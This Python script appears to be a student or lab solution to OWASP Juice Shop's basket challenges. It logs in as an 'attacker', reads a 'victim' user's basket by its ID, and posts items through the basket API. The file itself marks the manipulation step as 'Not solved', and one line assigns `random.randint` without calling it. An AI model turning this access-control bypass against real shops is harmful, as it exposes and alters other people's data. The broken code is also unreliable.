"""
This file is used to solve the OWASP Juice-shop Task
VIEW BASKET
# MANIPULATE BASKET   ----> Not solved
GOAL: to view or manipulate on other people's basket
"""

from plugins import attack as a
from plugins import login as usrLogin
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import random

class manipulate_basket(a.attack_inter):
    def __init__(self):
        self.juice_session = a.requests.session()

    def set_info(self, email, victimEmail):
        self.email = email
        self.victimEmail = victimEmail
        self.basketId = a.get_basket_id(self.email)
        self.victimBid = a.get_basket_id(self.victimEmail)
        self.cookie, self.header = a.get_auth(self.email)

    def view_basket(self, basektId):
        print('-----------------------------------------------------')
        print("Let us view user {} with  basket id {} --------------".format(self.email, basektId))
        try:
            productIds = []
            url = a.URL + '/rest/basket/' + str(basektId)
            response = self.juice_session.get(url, cookies=self.cookie, headers=self.header)
            print(response.text)
            products = response.json()["data"]["Products"]
            for i in range( len(products) ):
                item = products[i]
                productIds.append( item['id'] )
            print(productIds)
            return productIds
        except:
            print("1")

    def check_productId(self, basekId, productId):
        return productId in self.view_basket(basekId)

    def generate_productID(self, basketId):
        pId = random.randint(1,20)
        count = 0
        while self.check_productId(basketId, pId):
            if count > 10:
                return None
            pId = random.randint
            count += 1
        return pId

    def addto_basket(self, quantity):
        print('---------------------------------------------------')
        print("Let us add to basket ID {} ----------------".format(self.basketId))
        try:
            productId = self.generate_productID(self.basketId)
            print("we will add product Id {} ".format(productId))
            json = {
                "ProductId": productId,
                "BasketId": self.basketId,
                #"BasketId": "15",
                "quantity": quantity
            }
            url =a.URL + '/api/BasketItems/'
            response = self.juice_session.post(url, cookies=self.cookie, headers=self.header, json = json
                                               , verify= False)
            print(response.text)
            self.view_basket(self.basketId)
        except:
            print("2")

    def generator(self):
        return self.basketId

    def run(self):
        a.logging.basicConfig(filename='./test_logging_info.log', encoding='utf-8',
                            level=a.logging.INFO, format='%(asctime)s %(message)s')
        logger = a.logging.getLogger("Manipulate Basket")
        a.logging.info(logger)
        a.logging.info('Started')

        print("please enter attacker's email")
        email = input()
        print("please enter victim's email")
        victim_email = input()
        self.set_info(email=email, victimEmail=victim_email)
        self.view_basket(self.victimBid)
        self.addto_basket(quantity=1)
        a.logging.info('Finished')




